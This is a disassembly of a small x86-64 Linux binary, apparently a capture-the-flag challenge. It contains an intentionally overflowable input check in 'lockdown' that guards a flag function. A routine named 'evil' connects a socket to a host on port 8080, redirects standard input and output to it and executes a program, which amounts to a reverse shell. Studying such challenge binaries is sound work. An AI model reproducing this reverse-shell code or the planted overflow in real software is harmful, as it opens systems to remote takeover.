




_init:
        
        sub     rsp, 8                                  
        mov     rax, qword [rel ?_046]                  
        test    rax, rax                                
        jz      ?_001                                   
        call    rax                                     
?_001:
        add     rsp, 8                                  
        ret                                             



?_002:
        push    qword [rel ?_032]                       
        jmp     near [rel ?_033]                        


?_003:
        jmp     near [rel ?_034]                        

        push    0                                       
        jmp     ?_002                                   

?_004:
        
        jmp     near [rel ?_035]                        

        push    1                                       
        jmp     ?_002                                   

?_005:
        
        jmp     near [rel ?_036]                        

        push    2                                       
        jmp     ?_002                                   

?_006:
        
        jmp     near [rel ?_037]                        

        push    3                                       
        jmp     ?_002                                   

?_007:
        
        jmp     near [rel ?_038]                        

        push    4                                       
        jmp     ?_002                                   

?_008:
        
        jmp     near [rel ?_039]                        

        push    5                                       
        jmp     ?_002                                   

?_009:
        
        jmp     near [rel ?_040]                        

        push    6                                       
        jmp     ?_002                                   

?_010:
        
        jmp     near [rel ?_041]                        

        push    7                                       
        jmp     ?_002                                   

?_011:
        
        jmp     near [rel ?_042]                        

        push    8                                       
        jmp     ?_002                                   

?_012:
        
        jmp     near [rel ?_043]                        

        push    9                                       
        jmp     ?_002                                   



?_013:
        jmp     near [rel ?_048]                        





_start:
       
        xor     ebp, ebp                                
        mov     r9, rdx                                 
        pop     rsi                                     
        mov     rdx, rsp                                
        and     rsp, 0FFFFFFFFFFFFFFF0H                 
        push    rax                                     
        push    rsp                                     
        lea     r8, [rel __libc_csu_fini]               
        lea     rcx, [rel __libc_csu_init]              
        lea     rdi, [rel main]                         
        call    near [rel ?_045]                        
        hlt                                             

deregister_tm_clones:
        lea     rdi, [rel _edata]                       
        push    rbp                                     
        lea     rax, [rel _edata]                       
        cmp     rax, rdi                                
        mov     rbp, rsp                                
        jz      ?_014                                   
        mov     rax, qword [rel ?_044]                  
        test    rax, rax                                
        jz      ?_014                                   
        pop     rbp                                     
        jmp     rax                                     


?_014:
        pop     rbp                                     
        ret                                             



register_tm_clones:
        lea     rdi, [rel _edata]                       
        lea     rsi, [rel _edata]                       
        push    rbp                                     
        sub     rsi, rdi                                
        mov     rbp, rsp                                
        sar     rsi, 3                                  
        mov     rax, rsi                                
        shr     rax, 63                                 
        add     rsi, rax                                
        sar     rsi, 1                                  
        jz      ?_015                                   
        mov     rax, qword [rel ?_047]                  
        test    rax, rax                                
        jz      ?_015                                   
        pop     rbp                                     
        jmp     rax                                     


?_015:
        pop     rbp                                     
        ret                                             



        cmp     byte [rel _edata], 0                    
        jnz     ?_017                                   
        cmp     qword [rel ?_048], 0                    
        push    rbp                                     
        mov     rbp, rsp                                
        jz      ?_016                                   
        mov     rdi, qword [rel __dso_handle]           
        call    ?_013                                   
?_016:
        call    deregister_tm_clones                    
        mov     byte [rel _edata], 1                    
        pop     rbp                                     
        ret                                             


?_017:
        DB      0F3H                                    
        ret                                             



frame_dummy:
        push    rbp                                     
        mov     rbp, rsp                                
        pop     rbp                                     
        jmp     register_tm_clones                      

flag_me:
        push    rbp                                     
        mov     rbp, rsp                                
        lea     rdi, [rel ?_024]                        
        call    ?_005                                   
        nop                                             
        pop     rbp                                     
        ret                                             

lockdown:
        push    rbp                                     
        mov     rbp, rsp                                
        sub     rsp, 96                                 
        mov     rax, qword [fs:abs 28H]                 
        mov     qword [rbp-8H], rax                     
        xor     eax, eax                                
        mov     dword [rbp-54H], 0                      
        lea     rdi, [rel ?_025]                        
        call    ?_003                                   
        lea     rdi, [rel ?_026]                        
        call    ?_003                                   
        lea     rax, [rbp-50H]                          
        mov     rdi, rax                                
        mov     eax, 0                                  
        call    ?_009                                   
        cmp     dword [rbp-54H], -559039810             
        jnz     ?_018                                   
        mov     eax, 0                                  
        call    flag_me                                 
        jmp     ?_019                                   

?_018:
        lea     rdi, [rel ?_027]                        
        call    ?_003                                   
?_019:
        nop                                             
        mov     rax, qword [rbp-8H]                     
        xor     rax, qword [fs:abs 28H]                 
        jz      ?_020                                   
        call    ?_004                                   
?_020:
        leave                                           
        ret                                             

evil:
         
        push    rbp                                     
        mov     rbp, rsp                                
        sub     rsp, 32                                 
        mov     rax, rdi                                
        mov     rcx, rsi                                
        mov     rdx, rcx                                
        mov     qword [rbp-20H], rax                    
        mov     qword [rbp-18H], rdx                    
        mov     edx, 0                                  
        mov     esi, 1                                  
        mov     edi, 2                                  
        call    ?_012                                   
        mov     dword [rbp-4H], eax                     
        lea     rcx, [rbp-20H]                          
        mov     eax, dword [rbp-4H]                     
        mov     edx, 16                                 
        mov     rsi, rcx                                
        mov     edi, eax                                
        call    ?_010                                   
        mov     eax, dword [rbp-4H]                     
        mov     esi, 0                                  
        mov     edi, eax                                
        call    ?_007                                   
        mov     eax, dword [rbp-4H]                     
        mov     esi, 1                                  
        mov     edi, eax                                
        call    ?_007                                   
        mov     eax, dword [rbp-4H]                     
        mov     esi, 2                                  
        mov     edi, eax                                
        call    ?_007                                   
        mov     r8d, 0                                  
        mov     ecx, 0                                  
        lea     rdx, [rel ?_028]                        
        lea     rsi, [rel ?_029]                        
        lea     rdi, [rel ?_030]                        
        mov     eax, 0                                  
        call    ?_011                                   
        nop                                             
        leave                                           
        ret                                             

tmp:
          
        push    rbp                                     
        mov     rbp, rsp                                
        sub     rsp, 32                                 
        mov     rax, qword [fs:abs 28H]                 
        mov     qword [rbp-8H], rax                     
        xor     eax, eax                                
        mov     word [rbp-20H], 2                       
        lea     rdi, [rel ?_031]                        
        call    ?_008                                   
        mov     dword [rbp-1CH], eax                    
        mov     edi, 8080                               
        call    ?_006                                   
        mov     word [rbp-1EH], ax                      
        mov     rdx, qword [rbp-20H]                    
        mov     rax, qword [rbp-18H]                    
        mov     rdi, rdx                                
        mov     rsi, rax                                
        call    evil                                    
        nop                                             
        mov     rax, qword [rbp-8H]                     
        xor     rax, qword [fs:abs 28H]                 
        jz      ?_021                                   
        call    ?_004                                   
?_021:
        leave                                           
        ret                                             

main:
         
        push    rbp                                     
        mov     rbp, rsp                                
        mov     eax, 0                                  
        call    lockdown                                
        mov     eax, 0                                  
        call    tmp                                     
        mov     eax, 0                                  
        pop     rbp                                     
        ret                                             

        nop                                             

__libc_csu_init:
        push    r15                                     
        push    r14                                     
        mov     r15, rdx                                
        push    r13                                     
        push    r12                                     
        lea     r12, [rel __frame_dummy_init_array_entry]
        push    rbp                                     
        push    rbx                                     
        mov     r13d, edi                               
        mov     r14, rsi                                
        sub     rbp, r12                                
        sub     rsp, 8                                  
        sar     rbp, 3                                  
        call    _init                                   
        test    rbp, rbp                                
        jz      ?_023                                   
        xor     ebx, ebx                                

?_022:
        mov     rdx, r15                                
        mov     rsi, r14                                
        mov     edi, r13d                               
        call    near [r12+rbx*8]                        
        add     rbx, 1                                  
        cmp     rbp, rbx                                
        jnz     ?_022                                   
?_023:
        add     rsp, 8                                  
        pop     rbx                                     
        pop     rbp                                     
        pop     r12                                     
        pop     r13                                     
        pop     r14                                     
        pop     r15                                     
        ret                                             

        nop                                             


__libc_csu_fini:
        DB      0F3H                                    
        ret                                             



_fini:
        
        sub     rsp, 8                                  
        add     rsp, 8                                  
        ret                                             


